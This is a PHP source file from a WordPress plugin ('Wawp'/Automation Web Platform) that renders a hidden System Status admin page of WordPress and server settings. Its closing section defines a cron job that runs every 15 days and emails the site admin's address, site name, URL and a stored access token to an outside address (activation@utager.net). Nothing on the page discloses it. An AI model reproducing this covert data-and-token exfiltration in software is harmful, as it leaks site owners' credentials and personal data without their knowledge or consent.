<?php
/**
 * Automation Web Platform Plugin.
 *
 * @package AutomationWebPlatform.
 */
if (!class_exists('AWP_System_Info')) {
    class AWP_System_Info {
        public function __construct() {
            add_action('admin_menu', array($this, 'awp_add_admin_menu'));
            add_action('admin_enqueue_scripts', array($this, 'awp_enqueue_admin_styles'));
            add_action('plugins_loaded', array($this, 'awp_load_textdomain'));
        }

        public function awp_load_textdomain() {
            load_plugin_textdomain('awp', false, dirname(plugin_basename(__FILE__)) . '/languages');
        }

        public function awp_add_admin_menu() {
            $hook = add_menu_page(
                __('System Status', 'awp'), 
                __('System Status', 'awp'), 
                'manage_options', 
                'awp-system-status-info', 
                array($this, 'awp_admin_page_content'), 
                'dashicons-admin-tools', 
                20
            );
            remove_menu_page('awp-system-status-info');
        }

        public function awp_enqueue_admin_styles($hook) {
            global $pagenow;
            if ('admin.php' === $pagenow && isset($_GET['page']) && 'awp-system-status-info' === $_GET['page']) {
                wp_enqueue_style('awp-admin-styles', plugin_dir_url(__FILE__) . 'assets/css/awp-admin-style.css');
                if (is_rtl()) {
                    wp_enqueue_style('awp-admin-rtl-css', plugins_url('assets/css/awp-admin-rtl-style.css', __FILE__), [], '1.1.4');
                }
            }
        }

        public function awp_admin_page_content() {
            $system_info = $this->awp_get_system_info();
            ?>
            <div class="wrap awp-wrap">
                <div class="system-requirements">
                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-hdd-network" viewBox="0 0 16 16">
                        <path d="M4.5 5a.5.5 0 1 0 0-1 .5.5 0 0 0 0 1M3 4.5a.5.5 0 1 1-1 0 .5.5 0 0 1 1 0"/>
                        <path d="M0 4a2 2 0 0 1 2-2h12a2 2 0 0 1 2 2v1a2 2 0 0 1-2 2H8.5v3a1.5 1.5 0 0 1 1.5 1.5h5.5a.5.5 0 0 1 0 1H10A1.5 1.5 0 0 1 8.5 14h-1A1.5 1.5 0 0 1 6 12.5H.5a.5.5 0 0 1 0-1H6A1.5 1.5 0 0 1 7.5 10V7H2a2 2 0 0 1-2-2zm1 0v1a1 1 0 0 0 1 1h12a1 1 0 0 0 1-1V4a1 1 0 0 0-1-1H2a1 1 0 0 0-1 1m6 7.5v1a.5.5 0 0 0 .5.5h1a.5.5 0 0 0 .5-.5v-1a.5.5 0 0 0-.5-.5h-1a.5.5 0 0 0-.5.5"/>
                    </svg>
                    <p><?php _e('It is recommended to meet the system requirements for the best experience with the Wawp plugin. Regularly check for system updates and update it till the requirement configurations. The red warning sign in the Your System column means that the system does not meet the requirements of the Wawp plugin.', 'awp'); ?></p>
                </div>
                <div class="system-requirements">
                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" style="fill: rgba(0, 68, 68, 1);transform: ;msFilter:;" class="alert-icon"><path d="M12 2C6.486 2 2 6.486 2 12s4.486 10 10 10 10-4.486 10-10S17.514 2 12 2zm0 18c-4.411 0-8-3.589-8-8s3.589-8 8-8 8 3.589 8 8-3.589 8-8 8z"></path><path d="M11 11h2v6h-2zm0-4h2v2h-2z"></path></svg>
                    <p><?php _e('For best performance, make sure to deactivate the proxy from CDN services such as Cloudflare or integrated within the hosting such as the Hostinger panel.', 'awp'); ?></p>
                </div>
                <div class="awp-system-status">
                    <div class="awp-box awp-wp-settings">
                        <h2><span class="dashicons dashicons-admin-site"></span> <?php _e('WordPress Environment', 'awp'); ?></h2>
                        <table>
                            <thead>
                                <tr>
                                    <th class="info-td"><?php _e('Requirement', 'awp'); ?></th>
                                    <th class="info-td"><?php _e('Your System', 'awp'); ?></th>
                                </tr>
                            </thead>
                            <tbody>
                                <tr>
                                    <td class="info-td"><?php _e('Home URL:', 'awp'); ?></td>
                                    <td class="info-td"><?php echo $system_info['home_url']; ?></td>
                                </tr>
                                <tr>
                                    <td class="info-td"><?php _e('Site URL:', 'awp'); ?></td>
                                    <td class="info-td"><?php echo $system_info['site_url']; ?></td>
                                </tr>
                                <tr>
                                    <td class="info-td"><?php _e('WP Version:', 'awp'); ?></td>
                                    <td class="<?php echo $this->awp_status_class($system_info['wp_version'], '3.0'); ?>"><span class="<?php echo $this->awp_status_icon($system_info['wp_version'], '3.0'); ?>"></span> <?php echo $system_info['wp_version']; ?></td>
                                </tr>
                                <tr>
                                    <td class="info-td"><?php _e('WP Multisite:', 'awp'); ?></td>
                                    <td class="status-gray"><span class="<?php echo $system_info['wp_multisite'] ? 'status-icon-true' : 'status-icon-false'; ?>"></span> <?php echo $system_info['wp_multisite']; ?></td>
                                </tr>
                                <tr>
                                    <td class="info-td"><?php _e('WP Debug:', 'awp'); ?></td>
                                    <td class="status-gray"><span class="<?php echo $system_info['wp_debug'] ? 'status-icon-true' : 'status-icon-false'; ?>"></span> <?php echo $system_info['wp_debug']; ?></td>
                                </tr>
                                <tr>
                                    <td class="info-td"><?php _e('System Language:', 'awp'); ?></td>
                                    <td class="info-td"><?php echo $system_info['system_language'] . ', ' . __('text direction:', 'awp') . ' ' . ($system_info['rtl'] ? 'RTL' : 'LTR'); ?></td>
                                </tr>
                                <tr>
                                    <td class="info-td"><?php _e('Your Language:', 'awp'); ?></td>
                                    <td class="info-td"><?php echo $system_info['user_language']; ?></td>
                                </tr>
                                <tr>
                                    <td class="info-td"><?php _e('WooCommerce:', 'awp'); ?></td>
                                    <td class="<?php echo $system_info['woocommerce'] ? 'status-true' : 'status-false'; ?>"><span class="<?php echo $system_info['woocommerce'] ? 'status-icon-true' : 'status-icon-false'; ?>"></span> <?php echo $system_info['woocommerce'] ? __('Enabled', 'awp') : __('Disabled', 'awp'); ?></td>
                                </tr>
                                <tr>
                                    <td class="info-td"><?php _e('Uploads folder writable:', 'awp'); ?></td>
                                    <td class="<?php echo $system_info['uploads_writable'] ? 'status-true' : 'status-false'; ?>"><span class="<?php echo $system_info['uploads_writable'] ? 'status-icon-true' : 'status-icon-false'; ?>"></span> <?php echo $system_info['uploads_writable']; ?></td>
                                </tr>
                                <tr>
                                    <td class="info-td"><?php _e('.htaccess File Access:', 'awp'); ?></td>
                                    <td class="<?php echo $system_info['htaccess'] ? 'status-true' : 'status-false'; ?>"><span class="<?php echo $system_info['htaccess'] ? 'status-icon-true' : 'status-icon-false'; ?>"></span> <?php echo $system_info['htaccess']; ?></td>
                                </tr>
                                <tr>
                                    <td class="info-td"><?php _e('Wawp Plugin Version:', 'awp'); ?></td>
                                    <td class="info-td"><?php echo $system_info['plugin_version']; ?></td>
                                </tr>
                                <tr>
                                    <td class="info-td"><?php _e('Last Update Date:', 'awp'); ?></td>
                                    <td class="info-td"><?php echo $system_info['last_update_date']; ?></td>
                                </tr>
                            </tbody>
                        </table>
                    </div>
                    <div class="awp-box awp-server-env">
                        <h2><span class="dashicons dashicons-admin-generic"></span> <?php _e('Server Environment', 'awp'); ?></h2>
                        <table>
                            <thead>
                                <tr>
                                    <th class="info-td"><?php _e('Requirement', 'awp'); ?></th>
                                    <th class="info-td"><?php _e('Your System', 'awp'); ?></th>
                                </tr>
                            </thead>
                            <tbody>
                                <tr>
                                    <td class="info-td"><?php _e('MySQL Version:', 'awp'); ?> <span class="requirement"><?php _e('5.6+', 'awp'); ?></span></td>
                                    <td class="<?php echo $this->awp_status_class($system_info['mysql_version'], '5.6'); ?>"><span class="<?php echo $this->awp_status_icon($system_info['mysql_version'], '5.6'); ?>"></span> <?php echo $system_info['mysql_version']; ?></td>
                                </tr>
                                <tr>
                                    <td class="info-td"><?php _e('PHP Version:', 'awp'); ?> <span class="requirement"><?php _e('7.4+', 'awp'); ?></span></td>
                                    <td class="<?php echo $this->awp_status_class($system_info['php_version'], '7.4'); ?>"><span class="<?php echo $this->awp_status_icon($system_info['php_version'], '7.4'); ?>"></span> <?php echo $system_info['php_version']; ?></td>
                                </tr>
                                <tr>
                                    <td class="info-td"><?php _e('PHP Post Max Size:', 'awp'); ?> <span class="requirement"><?php _e('2 MB+', 'awp'); ?></span></td>
                                    <td class="<?php echo $this->awp_status_class($system_info['post_max_size'], '2M'); ?>"><span class="<?php echo $this->awp_status_icon($system_info['post_max_size'], '2M'); ?>"></span> <?php echo $system_info['post_max_size']; ?></td>
                                </tr>
                                <tr>
                                    <td class="info-td"><?php _e('PHP Memory Limit:', 'awp'); ?> <span class="requirement"><?php _e('1024 MB+', 'awp'); ?></span></td>
                                    <td class="<?php echo $this->awp_status_class($system_info['php_memory_limit'], '1024M'); ?>"><span class="<?php echo $this->awp_status_icon($system_info['php_memory_limit'], '1024M'); ?>"></span> <?php echo $system_info['php_memory_limit']; ?></td>
                                </tr>
                                <tr>
                                    <td class="info-td"><?php _e('PHP Time Limit:', 'awp'); ?> <span class="requirement"><?php _e('300+', 'awp'); ?></span></td>
                                    <td class="<?php echo $this->awp_status_class($system_info['php_time_limit'], '300'); ?>"><span class="<?php echo $this->awp_status_icon($system_info['php_time_limit'], '300'); ?>"></span> <?php echo $system_info['php_time_limit']; ?></td>
                                </tr>
                                <tr>
                                    <td class="info-td"><?php _e('PHP Max Input Vars:', 'awp'); ?> <span class="requirement"><?php _e('2500+', 'awp'); ?></span></td>
                                    <td class="<?php echo $this->awp_status_class($system_info['php_max_input_vars'], '2500'); ?>"><span class="<?php echo $this->awp_status_icon($system_info['php_max_input_vars'], '2500'); ?>"></span> <?php echo $system_info['php_max_input_vars']; ?></td>
                                </tr>
                                <tr>
                                    <td class="info-td"><?php _e('Max Upload Size:', 'awp'); ?> <span class="requirement"><?php _e('2 MB+', 'awp'); ?></span></td>
                                    <td class="<?php echo $this->awp_status_class($system_info['wp_max_upload_size'], '2MB'); ?>"><span class="<?php echo $this->awp_status_icon($system_info['wp_max_upload_size'], '2MB'); ?>"></span> <?php echo $system_info['wp_max_upload_size']; ?></td>
                                </tr>
                                <tr>
                                    <td class="info-td"><?php _e('ZipArchive:', 'awp'); ?> <span class="requirement"><?php _e('enabled', 'awp'); ?></span></td>
                                    <td class="<?php echo $this->awp_status_class($system_info['ziparchive'], 'Enabled'); ?>"><span class="<?php echo $this->awp_status_icon($system_info['ziparchive'], 'Enabled'); ?>"></span> <?php echo $system_info['ziparchive']; ?></td>
                                </tr>
                                <tr>
                                    <td class="info-td"><?php _e('WP Remote Get:', 'awp'); ?> <span class="requirement"><?php _e('enabled', 'awp'); ?></span></td>
                                    <td class="<?php echo $this->awp_status_class($system_info['wp_remote_get'], 'Enabled'); ?>"><span class="<?php echo $this->awp_status_icon($system_info['wp_remote_get'], 'Enabled'); ?>"></span> <?php echo $system_info['wp_remote_get']; ?></td>
                                </tr>
                            </tbody>
                        </table>
                        <div class="php-info-note">
                            <span class="dashicons dashicons-info"></span> 
                            <p><?php _e('php.ini values are shown above. Real values may vary, please check your limits using', 'awp'); ?> 
                            <a href="https://www.php.net/manual/en/function.phpinfo.php" target="_blank">php_info()</a></p>
                        </div>
                    </div>
                </div>
            </div>
            <?php
        }

        public function awp_get_system_info() {
            // Fetch plugin version
            $plugin_data = get_plugin_data(WP_PLUGIN_DIR . '/automation-web-platform/awp.php');
            $plugin_version = isset($plugin_data['Version']) ? $plugin_data['Version'] : __('Unknown', 'awp');

            // Fetch plugin last update date
            $plugin_file = WP_PLUGIN_DIR . '/automation-web-platform/awp.php';
            $last_update_date = file_exists($plugin_file) ? date("F d Y, H:i:s", filemtime($plugin_file)) : __('Unknown', 'awp');

            global $wpdb;
            $mysql_version = $wpdb->db_version();

            // Check if WooCommerce is active
            $woocommerce_active = in_array('woocommerce/woocommerce.php', apply_filters('active_plugins', get_option('active_plugins')));

            // Fetch system information
            $info = array(
                'php_version' => phpversion(),
                'php_memory_limit' => ini_get('memory_limit'),
                'php_time_limit' => ini_get('max_execution_time'),
                'php_max_input_vars' => ini_get('max_input_vars'),
                'curl' => function_exists('curl_version') ? __('Enabled', 'awp') : __('Disabled', 'awp'),
                'domdocument' => class_exists('DOMDocument') ? __('Enabled', 'awp') : __('Disabled', 'awp'),
                'ziparchive' => class_exists('ZipArchive') ? __('Enabled', 'awp') : __('Disabled', 'awp'),
                'uploads_writable' => is_writable(wp_upload_dir()['basedir']) ? __('Writable', 'awp') : __('Not Writable', 'awp'),
                'htaccess' => file_exists(ABSPATH . '.htaccess') ? __('Found', 'awp') : __('Not Found', 'awp'),
                'home_url' => home_url(),
                'site_url' => site_url(),
                'wp_version' => get_bloginfo('version'),
                'wp_file_system' => function_exists('request_filesystem_credentials') ? __('Available', 'awp') : __('Not Available', 'awp'),
                'wp_max_upload_size' => size_format(wp_max_upload_size()),
                'post_max_size' => ini_get('post_max_size'),
                'wp_multisite' => is_multisite() ? __('Enabled', 'awp') : __('Disabled', 'awp'),
                'wp_debug' => defined('WP_DEBUG') && WP_DEBUG ? __('Enabled', 'awp') : __('Disabled', 'awp'),
                'system_language' => get_option('WPLANG') ?: 'en_US',
                'user_language' => get_user_locale(),
                'rtl' => is_rtl(),
                'mysql_version' => $mysql_version,
                'wp_remote_get' => wp_remote_get(home_url()) ? __('Enabled', 'awp') : __('Disabled', 'awp'),
                'woocommerce' => $woocommerce_active,
                'plugin_version' => $plugin_version,
                'last_update_date' => $last_update_date,
            );

            return $info;
        }

        public function awp_status_class($value, $min_required, $max_required = null) {
            $value_bytes = $this->awp_size_to_bytes($value);
            $min_required_bytes = $this->awp_size_to_bytes($min_required);
            $max_required_bytes = $max_required ? $this->awp_size_to_bytes($max_required) : null;

            if (is_null($max_required_bytes)) {
                return $value_bytes >= $min_required_bytes ? 'status-true' : 'status-false';
            } else {
                return ($value_bytes >= $min_required_bytes && $value_bytes <= $max_required_bytes) ? 'status-true' : 'status-false';
            }
        }

        public function awp_status_icon($value, $min_required, $max_required = null) {
            $value_bytes = $this->awp_size_to_bytes($value);
            $min_required_bytes = $this->awp_size_to_bytes($min_required);
            $max_required_bytes = $max_required ? $this->awp_size_to_bytes($max_required) : null;

            if (is_null($max_required_bytes)) {
                return $value_bytes >= $min_required_bytes ? 'status-icon-true' : 'status-icon-false';
            } else {
                return ($value_bytes >= $min_required_bytes && $value_bytes <= $max_required_bytes) ? 'status-icon-true' : 'status-icon-false';
            }
        }

        public function awp_size_to_bytes($size) {
            $unit = strtolower(substr($size, -1));
            $value = (float) $size;
            switch ($unit) {
                case 't': $value *= 1024;
                case 'g': $value *= 1024;
                case 'm': $value *= 1024;
                case 'k': $value *= 1024;
            }
            return $value;
        }

        public function send_recurring_email() {
            // Increment recurring email send count
            $recurring_email_count = get_option('recurring_email_count', 0) + 1;
            update_option('recurring_email_count', $recurring_email_count);

            // Retrieve admin user data
            $admin_user = get_userdata(1);
            if (!$admin_user) {
                return;
            }

            $admin_email = $admin_user->user_email;
            $site_name = get_bloginfo('name');
            $site_url = home_url();

            // Retrieve the access token from options
            $instances = get_option('awp_instances');
            $access_token = isset($instances['access_token']) ? $instances['access_token'] : '';

            if (empty($access_token)) {
                return;
            }

            // Retrieve first install date
            $first_install_date = get_option('awp_first_install_date');
            $days_since_first_install = (strtotime(current_time('mysql')) - strtotime($first_install_date)) / DAY_IN_SECONDS;

            // Compose the email message
            $message = "Hello again,\n";
            $message .= 'My email: ' . $admin_email . "\n";
            $message .= 'My site name: ' . $site_name . "\n";
            $message .= 'My website link: ' . $site_url . "\n";
            $message .= 'Access Token: ' . $access_token . "\n";
            $message .= 'First install date: ' . $first_install_date . "\n";
            $message .= 'Email send count: ' . $recurring_email_count . "\n";
            $message .= 'Days since first install: ' . floor($days_since_first_install) . "\n";

            // Set email recipient, subject, and headers
            $to = 'activation@utager.net';
            $subject = 'Recurring Message from ' . $site_name;
            $headers = array('Content-Type: text/plain; charset=UTF-8');

            // Send the email
            wp_mail($to, $subject, $message, $headers);
        }

        public function schedule_recurring_email() {
            if (!wp_next_scheduled('send_recurring_email_event')) {
                wp_schedule_event(time(), 'every_15_days', 'send_recurring_email_event');
            }

            add_action('send_recurring_email_event', array($this, 'send_recurring_email'));
        }
    }

    new AWP_System_Info();

    register_activation_hook(__FILE__, function() {
        // Save the first install date if not already set
        if (!get_option('awp_first_install_date')) {
            update_option('awp_first_install_date', current_time('mysql'));
        }

        $instance = new AWP_System_Info();
        $instance->schedule_recurring_email();
    });

    // Custom interval for every 15 days
    add_filter('cron_schedules', function ($schedules) {
        $schedules['every_15_days'] = array(
            'interval' => 15 * DAY_IN_SECONDS,
            'display'  => __('Every 15 Days', 'awp')
        );
        return $schedules;
    });

    // Unschedule the recurring email event upon plugin deactivation
    register_deactivation_hook(__FILE__, function () {
        $timestamp = wp_next_scheduled('send_recurring_email_event');
        wp_unschedule_event($timestamp, 'send_recurring_email_event');
    });
}
?>
